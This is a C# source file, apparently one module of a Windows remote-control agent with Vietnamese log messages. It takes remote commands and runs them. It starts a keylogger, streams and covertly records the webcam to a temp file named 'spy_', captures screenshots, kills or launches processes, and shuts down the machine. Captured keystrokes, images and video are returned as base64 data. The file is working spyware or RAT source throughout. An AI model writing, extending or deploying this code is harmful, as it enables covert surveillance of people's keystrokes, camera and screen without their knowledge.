using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading.Tasks;
using System.Linq;
using System.Collections.Generic;
using FlashCap;
using SharpAvi;
using SharpAvi.Output;
using SharpAvi.Codecs;

namespace WindowsAgent
{
    public class Feature
    {
        public event Action<string> OnDataReady;
        private KeyLoggerService _keyLogger = new KeyLoggerService();
        
        // Camera Vars
        private CaptureDevice _captureDevice;
        private bool _isStreaming = false;
        private bool _isRecordingToFile = false;
        private DateTime _lastFrameTime = DateTime.MinValue;
        private DateTime _lastRecordTime = DateTime.MinValue;

        // Recorder Vars
        private AviWriter _aviWriter;
        private IAviVideoStream _aviStream;
        private DateTime _recordStartTime;
        private int _recordDuration;
        private string _tempVideoFile;
        private object _cameraLock = new object();

        public string ProcessCommand(string cmd)
        {
            try
            {
                if (cmd.StartsWith("CMD_KILL_PROC:"))
                {
                    string pidStr = cmd.Split(':')[1];
                    return KillProcessByPid(pidStr);
                }

                if (cmd.StartsWith("CMD_START_APP:"))
                {
                    string appName = cmd.Substring("CMD_START_APP:".Length);
                    return StartAppByName(appName);
                }

                if (cmd.StartsWith("CMD_RECORD_VIDEO:"))
                {
                    try {
                        int duration = int.Parse(cmd.Split(':')[1]);
                        Task.Run(() => StartRecordingToFile(duration));
                        return $"LOG: Đang quay video {duration}s (FPS: {24})...";
                    } catch { return "ERROR: Sai tham số video."; }
                }

                switch (cmd)
                {
                    case "REGISTERED_OK": return ""; 
                    case "CMD_PING": return "PONG: " + DateTime.Now.ToString("HH:mm:ss");
                    case "CMD_GET_PROCESS": return "LIST_PROC:" + GetRunningProcesses();
                    case "CMD_GET_APPS": return "LIST_PROC:" + GetInstalledAppsWithPaths();
                    case "CMD_SCREENSHOT": return "IMG_BASE64:" + TakeScreenshot();
                    case "CMD_SHUTDOWN": ShutdownComputer(); return "LOG: Tắt máy...";
                    case "CMD_RESTART": RestartComputer(); return "LOG: Khởi động lại...";
                    case "CMD_CLOSE_AGENT": Application.Exit(); return "LOG: Đóng Agent...";

                    case "CMD_CAM_ON": Task.Run(() => StartWebcamStream()); return "LOG: Bật Stream...";
                    case "CMD_CAM_OFF": StopWebcamStream(); return "LOG: Tắt Camera.";
                    case "CMD_WEBCAM_STOP": StopRecordingToFile(); return "LOG: Dừng quay.";

                    case "CMD_KEYLOG_START": _keyLogger.Start(); return "LOG: Keylog ON.";
                    case "CMD_KEYLOG_STOP": _keyLogger.Stop(); return "LOG: Keylog OFF.";
                    case "CMD_KEYLOG_GET": 
                        string l = _keyLogger.GetLogs(); 
                        return string.IsNullOrEmpty(l) ? "LOG: Trống." : "KEYLOG_DATA:" + l;

                    default: return "LOG: Lệnh lạ (" + cmd + ")";
                }
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        private void StartWebcamStream()
        {
            lock (_cameraLock) {
                if (_captureDevice != null) {
                    _isStreaming = true;
                    OnDataReady?.Invoke("LOG: Camera đang chạy, bật thêm Stream.");
                    return;
                }
            }
            InitAndStartCamera(true, false);
        }

        private void StartRecordingToFile(int duration)
        {
            _recordDuration = duration;
            _recordStartTime = DateTime.Now;
            _tempVideoFile = Path.Combine(Path.GetTempPath(), $"spy_{DateTime.Now.Ticks}.avi");

            try {
                // Cấu hình AVI Writer dùng MJPEG
                _aviWriter = new AviWriter(_tempVideoFile) { FramesPerSecond = 10, EmitIndex1 = true };
                _aviStream = _aviWriter.AddVideoStream();
                _aviStream.Width = 640; _aviStream.Height = 480;
                _aviStream.Codec = CodecIds.MotionJpeg; // Codec nén ảnh
                _aviStream.BitsPerPixel = BitsPerPixel.Bpp24;

                _isRecordingToFile = true;

                lock (_cameraLock) {
                    if (_captureDevice == null) InitAndStartCamera(false, true);
                    else OnDataReady?.Invoke("LOG: Bắt đầu ghi hình.");
                }
            }
            catch (Exception ex) {
                OnDataReady?.Invoke("ERROR: Lỗi tạo file - " + ex.Message);
                _isRecordingToFile = false;
            }
        }

        private void InitAndStartCamera(bool stream, bool record)
        {
            Task.Run(async () => {
                try {
                    if (stream) _isStreaming = true;
                    if (record) _isRecordingToFile = true;

                    var devices = new CaptureDevices();
                    var descs = devices.EnumerateDescriptors().ToList();
                    if (descs.Count == 0) { OnDataReady?.Invoke("LOG: Không có Webcam!"); return; }

                    var desc = descs[0];
                    var characteristics = desc.Characteristics.FirstOrDefault(c => c.PixelFormat == PixelFormats.JPEG) 
                                          ?? desc.Characteristics[0];

                    lock (_cameraLock) {
                        if (_captureDevice == null) {
                            _captureDevice = desc.OpenAsync(characteristics, OnPixelBufferArrived).Result;
                            _captureDevice.StartAsync().Wait();
                            OnDataReady?.Invoke("LOG: Camera đã bật.");
                        }
                    }
                } catch (Exception ex) {
                    OnDataReady?.Invoke("ERROR: Camera lỗi - " + ex.Message);
                    _isRecordingToFile = false; _isStreaming = false;
                }
            });
        }

        private void OnPixelBufferArrived(PixelBufferScope buffer)
        {
            try {
                byte[] img = buffer.Buffer.ExtractImage();
                using (MemoryStream ms = new MemoryStream(img))
                using (Bitmap bmp = new Bitmap(ms)) {
                    using (MemoryStream outMs = new MemoryStream()) {
                        bmp.Save(outMs, ImageFormat.Jpeg);
                        string b64 = Convert.ToBase64String(outMs.ToArray());
                        OnDataReady?.Invoke("IMG_BASE64:" + b64);
                    }

                    // 2. RECORDING (SỬA LỖI MÀN HÌNH ĐEN TẠI ĐÂY)
                    if (_isRecordingToFile && _aviStream != null) {
                        if ((DateTime.Now - _recordStartTime).TotalSeconds >= _recordDuration + 2) {
                            Task.Run(() => StopRecordingToFile());
                        } else {
                            _lastRecordTime = DateTime.Now;
                            using (Bitmap resized = new Bitmap(bmp, new Size(640, 480))) {
                                using (MemoryStream videoMs = new MemoryStream())
                                {
                                    resized.Save(videoMs, ImageFormat.Jpeg); // Nén ảnh
                                    byte[] videoData = videoMs.ToArray();    // Lấy dữ liệu nén
                                    _aviStream.WriteFrame(true, videoData, 0, videoData.Length); 
                                }
                            }
                        }
                    }
                }
            } catch { } finally { buffer.ReleaseNow(); }
        }

        private async void StopRecordingToFile()
        {
            if (!_isRecordingToFile) return;
            _isRecordingToFile = false;

            try {
                if (_aviWriter != null) { _aviWriter.Close(); _aviWriter = null; }
                await Task.Delay(2000); // Đợi ổ cứng

                if (File.Exists(_tempVideoFile)) {
                    long size = new FileInfo(_tempVideoFile).Length;
                    if (size > 0) {
                        byte[] bytes = File.ReadAllBytes(_tempVideoFile);
                        string b64 = Convert.ToBase64String(bytes);
                        OnDataReady?.Invoke("VIDEO_DATA:" + b64);
                        try { File.Delete(_tempVideoFile); } catch { }
                        OnDataReady?.Invoke("LOG: Đã gửi video.");
                    } else {
                        OnDataReady?.Invoke("LOG: Video rỗng.");
                    }
                }
            }
            catch (Exception ex) { OnDataReady?.Invoke("ERROR: Gửi video lỗi - " + ex.Message); }

            if (!_isStreaming) await StopPhysicalCamera();
        }

        private async void StopWebcamStream() {
            _isStreaming = false;
            if (!_isRecordingToFile) await StopPhysicalCamera();
        }

        private async Task StopPhysicalCamera() {
            lock (_cameraLock) {
                if (_captureDevice != null) {
                    _captureDevice.StopAsync().Wait();
                    _captureDevice.Dispose();
                    _captureDevice = null;
                }
            }
        }

        // Utils & App Management
        private string StartAppByName(string appName) { try { Process.Start(appName); return $"LOG: Đã mở {appName}"; } catch (Exception e) { return "ERROR: " + e.Message; } }
        private string KillProcessByPid(string pidStr) { try { Process.GetProcessById(int.Parse(pidStr)).Kill(); return $"LOG: Killed PID {pidStr}"; } catch { return "ERROR: Không tắt được."; } }
        private string GetRunningProcesses() { StringBuilder s=new StringBuilder(); foreach(Process p in Process.GetProcesses()) try{s.AppendLine($"- {p.ProcessName} ({p.Id})");}catch{} return s.ToString(); }
        public string GetInstalledAppsWithPaths() {
            StringBuilder sb = new StringBuilder();
            var apps = new List<(string Name, string Path)>();
            SearchRegistry(RegistryHive.LocalMachine, RegistryView.Registry64, apps);
            SearchRegistry(RegistryHive.LocalMachine, RegistryView.Registry32, apps);
            SearchRegistry(RegistryHive.CurrentUser, RegistryView.Default, apps);
            apps.Sort((x, y) => string.Compare(x.Name, y.Name));
            foreach (var app in apps) { sb.AppendLine($"Name: {app.Name}"); if(!string.IsNullOrEmpty(app.Path)) sb.AppendLine($"Path: {app.Path}"); sb.AppendLine(); }
            return sb.ToString();
        }
        private void SearchRegistry(RegistryHive hive, RegistryView view, List<(string Name, string Path)> apps) {
            try { using(var k=RegistryKey.OpenBaseKey(hive,view).OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")) if(k!=null) foreach(var n in k.GetSubKeyNames()) { using(var sk=k.OpenSubKey(n)) { if(sk==null) continue; var d=sk.GetValue("DisplayName") as string; if(string.IsNullOrEmpty(d)) continue; var i=sk.GetValue("DisplayIcon") as string; var l=sk.GetValue("InstallLocation") as string; string p = !string.IsNullOrEmpty(i) ? i.Split(',')[0].Trim('"') : (!string.IsNullOrEmpty(l) ? l.Trim('"') : ""); if(!apps.Exists(x=>x.Name==d)) apps.Add((d, p)); } } } catch {}
        }
        private string TakeScreenshot() { try{var b=Screen.GetBounds(Point.Empty);using(var bmp=new Bitmap(b.Width,b.Height)){using(var g=Graphics.FromImage(bmp))g.CopyFromScreen(Point.Empty,Point.Empty,b.Size);using(var ms=new MemoryStream()){bmp.Save(ms,ImageFormat.Png);return Convert.ToBase64String(ms.ToArray());}}}catch{return "";} }
        private void ShutdownComputer() => Process.Start(new ProcessStartInfo("shutdown","/s /t 0"){CreateNoWindow=true,UseShellExecute=false});
        private void RestartComputer() => Process.Start(new ProcessStartInfo("shutdown","/r /t 0"){CreateNoWindow=true,UseShellExecute=false});
    }
}